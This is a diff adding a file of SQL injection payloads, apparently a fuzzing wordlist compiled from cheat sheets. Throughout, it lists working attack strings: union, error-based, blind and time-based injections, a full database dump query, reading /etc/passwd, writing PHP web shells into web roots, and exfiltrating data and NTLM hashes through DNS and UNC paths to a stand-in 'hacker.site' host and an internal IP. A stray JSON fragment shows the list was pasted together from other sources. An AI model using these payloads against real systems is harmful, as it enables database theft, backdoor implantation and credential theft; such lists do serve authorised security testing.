@@ -1,0 +1,113 @@
+'
+1--
+1 --
+1  --
+1/*
+1 /*
+1  /*
+1*1--
+1 * 1--
+1 * 1 --
+1*1/*
+1 * 1/*
+1 * 1 /*
+1 * 1  /*
+,@version--
+@@version--
+@version --
+,@version /*
+@version/*
+1 OR 1=1
+1\' OR \'1\'=\'1
+1\'1
+1 EXEC XP_
+1 AND 1=1
+1\' AND 1=(SELECT COUNT(*) FROM tablenames); --
+1 AND USER_NAME() = \'dbo\'
+\\\'; DESC users; --
+1\\\'1
+1\' AND non_existant_table = \'1
+\' OR username IS NOT NULL OR username = \'
+1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116
+ SQL Injection Cheet Sheet"},{"string":
+1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\' --
+1 UNI/**/ON SELECT ALL FROM WHERE
+%31%27%20%4F%52%20%27%31%27%3D%27%31
+&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;
+&#49&#39&#32&#
+,order by 1
+order by 2
+order by 3
+,order by XXX
+,UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
+?id=(1)and(SELECT * from db.users)=(1)
+?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
+--#1060 - Duplicate column name 'id'
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
+-- #1060 - Duplicate column name 'name'
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
+select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
+select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+' and updatexml(null,concat(0x0a,version()),null)-- -
+' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+?id=1 and substring(version(),1,1)=5
+?id=1 and right(left(version(),1),1)=5
+?id=1 and left(version(),1)=4
+?id=1 and ascii(lower(substr(Version(),1,1)))=51
+?id=1 and (select mid(version(),1,1)=4)
+2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
+AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
+AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
+AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
+AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
+SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
+MYSQL Time Based
++BENCHMARK(40000000,SHA1(1337))+
+'%2Bbenchmark(3200,SHA1(1))%2B'
+' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
+RLIKE SLEEP([SLEEPTIME])
+OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+?id=1 and IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
+?id=1 and IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
+MYSQL DIOS - Dump in One Shot
+(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
+(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
+union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
+union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
+MYSQL Read content of a file
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
+MYSQL Write a shell
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
+-1 UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
+[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
+select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
+select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
+select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
+UNC Path - NTLM hash stealing
+select load_file('\\\\error\\abc');
+select load_file(0x5c5c5c5c6572726f725c5c616263);
+select 'osanda' into dumpfile '\\\\error\\abc';
+select 'osanda' into outfile '\\\\error\\abc';
+load data infile '\\\\error\\abc' into table database.table_name;
